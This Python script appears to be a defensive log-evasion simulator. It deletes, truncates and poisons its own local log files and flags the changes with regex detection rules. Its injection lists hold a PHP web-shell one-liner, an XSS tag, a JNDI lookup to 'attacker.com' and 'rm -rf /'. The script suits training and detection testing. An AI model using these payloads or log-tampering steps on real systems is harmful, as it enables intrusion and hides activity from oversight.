#!/usr/bin/env python3
import logging
import random
import time
import hashlib
import json
import base64
import re
import string
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Optional
import threading
from dataclasses import dataclass
import argparse

@dataclass
class LogEntry:
    timestamp: str
    source: str
    level: str
    message: str
    raw_data: str
    evasion_detected: bool = False
    detection_reason: str = ""

class LogEvasionSimulator:
    def __init__(self):
        self.log_files = {
            'auth': 'logs/auth.log',
            'system': 'logs/system.log',
            'web': 'logs/web_access.log',
            'security': 'logs/security.log'
        }
        self.detection_rules = []
        self.evasion_attempts = []
        self.setup_logging()
        self.load_detection_rules()
        
    def setup_logging(self):
        """Setup logging directories and files"""
        Path('logs').mkdir(exist_ok=True)
        
        for log_file in self.log_files.values():
            Path(log_file).parent.mkdir(exist_ok=True)
            with open(log_file, 'w') as f:
                f.write(f"# Log file created at {datetime.now()}\n")
    
    def load_detection_rules(self):
        """Load log evasion detection rules"""
        self.detection_rules = [
            {
                'name': 'timestamp_anomaly',
                'pattern': r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}',
                'description': 'Timestamp format validation'
            },
            {
                'name': 'log_deletion_pattern',
                'pattern': r'LOG_DELETION|rm.*log|truncate',
                'description': 'Log deletion commands'
            },
            {
                'name': 'suspicious_characters',
                'pattern': r'[\x00-\x1f\x7f-\xff]',
                'description': 'Non-printable characters'
            },
            {
                'name': 'base64_encoding',
                'pattern': r'[A-Za-z0-9+/]{20,}={0,2}',
                'description': 'Base64 encoded data'
            },
            {
                'name': 'hex_encoding',
                'pattern': r'\\x[0-9a-fA-F]{2}',
                'description': 'Hex encoded characters'
            }
        ]
    
    def generate_normal_logs(self, count: int = 100):
        """Generate normal system logs"""
        log_sources = [
            ('auth', 'sshd', ['INFO', 'WARNING']),
            ('system', 'kernel', ['INFO', 'ERROR']),
            ('web', 'apache', ['INFO']),
            ('security', 'firewall', ['INFO', 'ALERT'])
        ]
        
        normal_messages = [
            "User authentication successful",
            "Connection established",
            "System startup completed",
            "Regular maintenance task",
            "Backup process started",
            "Network interface up",
            "User session started",
            "File access granted",
            "Database connection established",
            "Scheduled task executed"
        ]
        
        for _ in range(count):
            source_type, source, levels = random.choice(log_sources)
            level = random.choice(levels)
            message = random.choice(normal_messages)
            
            log_entry = self.create_log_entry(
                source_type=source_type,
                source=source,
                level=level,
                message=message
            )
            
            self.write_log(log_entry)
            time.sleep(0.01)
    
    def create_log_entry(self, source_type: str, source: str, level: str, message: str) -> LogEntry:
        """Create a standardized log entry"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"{timestamp} {source}[{level}]: {message}"
        
        return LogEntry(
            timestamp=timestamp,
            source=source,
            level=level,
            message=message,
            raw_data=log_message
        )
    
    def write_log(self, log_entry: LogEntry):
        """Write log entry to appropriate file"""
        log_file = self.log_files.get(log_entry.source, 'logs/general.log')
        
        with open(log_file, 'a') as f:
            f.write(log_entry.raw_data + '\n')
    
    def simulate_log_deletion(self, log_type: str = 'auth'):
        """Simulate log file deletion/truncation"""
        print(f"[*] Simulating log deletion for {log_type}")
        
        log_file = self.log_files[log_type]
        
        # Method 1: Complete deletion
        if random.choice([True, False]):
            try:
                Path(log_file).unlink()
                print(f"[!] Log file {log_file} deleted")
                self.evasion_attempts.append({
                    'technique': 'log_deletion',
                    'target': log_file,
                    'timestamp': datetime.now()
                })
            except:
                pass
        
        # Method 2: Truncation
        else:
            try:
                with open(log_file, 'w') as f:
                    f.write(f"# Log truncated at {datetime.now()}\n")
                print(f"[!] Log file {log_file} truncated")
                self.evasion_attempts.append({
                    'technique': 'log_truncation',
                    'target': log_file,
                    'timestamp': datetime.now()
                })
            except:
                pass
    
    def simulate_timestamp_manipulation(self):
        """Simulate timestamp manipulation in logs"""
        print("[*] Simulating timestamp manipulation")
        
        techniques = [
            'future_timestamps',
            'past_timestamps', 
            'inconsistent_timestamps',
            'missing_timestamps'
        ]
        
        technique = random.choice(techniques)
        
        if technique == 'future_timestamps':
            future_time = datetime.now() + timedelta(days=365)
            timestamp = future_time.strftime('%Y-%m-%d %H:%M:%S')
            message = f"{timestamp} kernel[INFO]: Suspicious future timestamp"
            
        elif technique == 'past_timestamps':
            past_time = datetime.now() - timedelta(days=365)
            timestamp = past_time.strftime('%Y-%m-%d %H:%M:%S')
            message = f"{timestamp} kernel[INFO]: Suspicious past timestamp"
            
        elif technique == 'inconsistent_timestamps':
            timestamp = "2024-13-45 25:61:61"  # Invalid timestamp
            message = f"{timestamp} kernel[INFO]: Invalid timestamp format"
            
        else:  # missing_timestamps
            timestamp = ""
            message = f"kernel[INFO]: Missing timestamp entry"
        
        log_entry = LogEntry(
            timestamp=timestamp,
            source='kernel',
            level='INFO',
            message=message,
            raw_data=message
        )
        
        self.write_log(log_entry)
        self.evasion_attempts.append({
            'technique': 'timestamp_manipulation',
            'method': technique,
            'timestamp': datetime.now()
        })
    
    def simulate_log_injection(self):
        """Simulate log injection attacks"""
        print("[*] Simulating log injection")
        
        injection_payloads = [
            "\n\n[ALERT] SECURITY BREACH DETECTED\n",
            "<?php system($_GET['cmd']); ?>",
            "<script>alert('XSS')</script>",
            "admin\nlogin successful",
            f"DEBUG: {base64.b64encode(b'secret_data').decode()}",
            "ERROR: " + "A" * 1000  # Log flooding
        ]
        
        payload = random.choice(injection_payloads)
        
        log_entry = self.create_log_entry(
            source_type='web',
            source='apache',
            level='INFO',
            message=f"Normal log entry {payload}"
        )
        
        self.write_log(log_entry)
        self.evasion_attempts.append({
            'technique': 'log_injection',
            'payload_type': type(payload).__name__,
            'timestamp': datetime.now()
        })
    
    def simulate_data_obfuscation(self):
        """Simulate data obfuscation techniques"""
        print("[*] Simulating data obfuscation")
        
        techniques = [
            'base64_encoding',
            'hex_encoding',
            'rot13_encoding',
            'string_reversal',
            'whitespace_manipulation'
        ]
        
        technique = random.choice(techniques)
        original_message = "suspicious_command_executed"
        
        if technique == 'base64_encoding':
            encoded = base64.b64encode(original_message.encode()).decode()
            message = f"Command: {encoded}"
            
        elif technique == 'hex_encoding':
            encoded = original_message.encode().hex()
            message = f"Command: {encoded}"
            
        elif technique == 'rot13_encoding':
            encoded = original_message.translate(
                str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
                )
            )
            message = f"Command: {encoded}"
            
        elif technique == 'string_reversal':
            encoded = original_message[::-1]
            message = f"Command: {encoded}"
            
        else:  # whitespace_manipulation
            encoded = ' '.join(original_message)
            message = f"Command: {encoded}"
        
        log_entry = self.create_log_entry(
            source_type='system',
            source='bash',
            level='INFO',
            message=message
        )
        
        self.write_log(log_entry)
        self.evasion_attempts.append({
            'technique': 'data_obfuscation',
            'method': technique,
            'original': original_message,
            'encoded': encoded,
            'timestamp': datetime.now()
        })
    
    def simulate_log_poisoning(self):
        """Simulate log poisoning attacks"""
        print("[*] Simulating log poisoning")
        
        poisoning_methods = [
            'format_string_injection',
            'code_injection',
            'log_level_manipulation',
            'source_spoofing'
        ]
        
        method = random.choice(poisoning_methods)
        
        if method == 'format_string_injection':
            message = "User %s executed command: %s" % ("admin", "rm -rf /")
            
        elif method == 'code_injection':
            message = "Error: ${jndi:ldap://attacker.com/exploit}"
            
        elif method == 'log_level_manipulation':
            # Downgrade severity
            message = "CRITICAL: Unauthorized access attempt [DEBUG]"
            
        else:  # source_spoofing
            message = "root[ALERT]: Password changed for user admin"
        
        log_entry = self.create_log_entry(
            source_type='auth',
            source='sshd' if random.choice([True, False]) else 'spoofed_daemon',
            level=random.choice(['INFO', 'DEBUG', 'ERROR']),
            message=message
        )
        
        self.write_log(log_entry)
        self.evasion_attempts.append({
            'technique': 'log_poisoning',
            'method': method,
            'timestamp': datetime.now()
        })
    
    def monitor_logs(self):
        """Monitor logs for evasion attempts"""
        print("[*] Starting log monitoring...")
        
        while True:
            for log_type, log_file in self.log_files.items():
                if Path(log_file).exists():
                    self.analyze_log_file(log_file)
            
            time.sleep(5)  # Check every 5 seconds
    
    def analyze_log_file(self, log_file: str):
        """Analyze log file for evasion patterns"""
        try:
            with open(log_file, 'r') as f:
                lines = f.readlines()
            
            for line_num, line in enumerate(lines[-100:], 1):  # Check last 100 lines
                detected = self.detect_evasion_patterns(line)
                
                if detected:
                    print(f"[!] Evasion detected in {log_file}:{line_num}")
                    print(f"    Pattern: {detected['pattern']}")
                    print(f"    Reason: {detected['description']}")
                    print(f"    Line: {line.strip()}")
                    
        except Exception as e:
            pass  # File might be deleted
    
    def detect_evasion_patterns(self, log_line: str) -> Optional[Dict]:
        """Detect evasion patterns in log lines"""
        for rule in self.detection_rules:
            if re.search(rule['pattern'], log_line, re.IGNORECASE):
                return {
                    'pattern': rule['name'],
                    'description': rule['description'],
                    'log_line': log_line
                }
        
        # Custom detection logic
        if len(log_line) > 1000:  # Log flooding
            return {
                'pattern': 'log_flooding',
                'description': 'Excessively long log entry',
                'log_line': log_line[:100] + '...'
            }
        
        if re.search(r'[\x00-\x08\x0b-\x0c\x0e-\x1f]', log_line):  # Control characters
            return {
                'pattern': 'control_characters',
                'description': 'Non-printable control characters detected',
                'log_line': log_line
            }
        
        return None
    
    def run_evasion_simulation(self, duration: int = 300):
        """Run complete evasion simulation"""
        print(f"[*] Starting log evasion simulation for {duration} seconds")
        
        # Start monitoring in background
        monitor_thread = threading.Thread(target=self.monitor_logs, daemon=True)
        monitor_thread.start()
        
        # Generate normal logs
        normal_log_thread = threading.Thread(
            target=self.generate_normal_logs, 
            args=(1000,),
            daemon=True
        )
        normal_log_thread.start()
        
        # Run evasion techniques
        start_time = time.time()
        evasion_techniques = [
            self.simulate_log_deletion,
            self.simulate_timestamp_manipulation,
            self.simulate_log_injection,
            self.simulate_data_obfuscation,
            self.simulate_log_poisoning
        ]
        
        while time.time() - start_time < duration:
            # Randomly execute evasion techniques
            if random.random() < 0.3:  # 30% chance each iteration
                technique = random.choice(evasion_techniques)
                technique()
            
            time.sleep(10)  # Wait between attempts
        
        self.generate_report()
    
    def generate_report(self):
        """Generate simulation report"""
        print("\n" + "="*60)
        print("LOG EVASION SIMULATION REPORT")
        print("="*60)
        
        print(f"\nEvasion Attempts: {len(self.evasion_attempts)}")
        
        # Group by technique
        techniques = {}
        for attempt in self.evasion_attempts:
            tech = attempt['technique']
            if tech not in techniques:
                techniques[tech] = 0
            techniques[tech] += 1
        
        print("\nTechnique Breakdown:")
        for tech, count in techniques.items():
            print(f"  {tech}: {count} attempts")
        
        # Check log integrity
        print("\nLog File Status:")
        for log_type, log_file in self.log_files.items():
            if Path(log_file).exists():
                size = Path(log_file).stat().st_size
                print(f"  {log_type}: {size} bytes (EXISTS)")
            else:
                print(f"  {log_type:10} DELETED/MISSING")
        
        print("\nDefense Recommendations:")
        recommendations = [
            "Implement centralized logging",
            "Use log integrity monitoring",
            "Enable log file permissions",
            "Deploy SIEM with correlation rules",
            "Use immutable logging where possible",
            "Monitor for log deletion patterns",
            "Implement log rate limiting",
            "Use cryptographic log signing"
        ]
        
        for rec in recommendations:
            print(f"  ✓ {rec}")

def main():
    parser = argparse.ArgumentParser(description="Log Evasion Simulator")
    parser.add_argument("--duration", type=int, default=300, help="Simulation duration in seconds")
    parser.add_argument("--technique", choices=['deletion', 'timestamp', 'injection', 'obfuscation', 'poisoning'], 
                       help="Run specific technique")
    
    args = parser.parse_args()
    
    simulator = LogEvasionSimulator()
    
    if args.technique:
        # Run specific technique
        if args.technique == 'deletion':
            simulator.simulate_log_deletion()
        elif args.technique == 'timestamp':
            simulator.simulate_timestamp_manipulation()
        elif args.technique == 'injection':
            simulator.simulate_log_injection()
        elif args.technique == 'obfuscation':
            simulator.simulate_data_obfuscation()
        elif args.technique == 'poisoning':
            simulator.simulate_log_poisoning()
    else:
        # Run complete simulation
        simulator.run_evasion_simulation(args.duration)

if __name__ == "__main__":
    main()
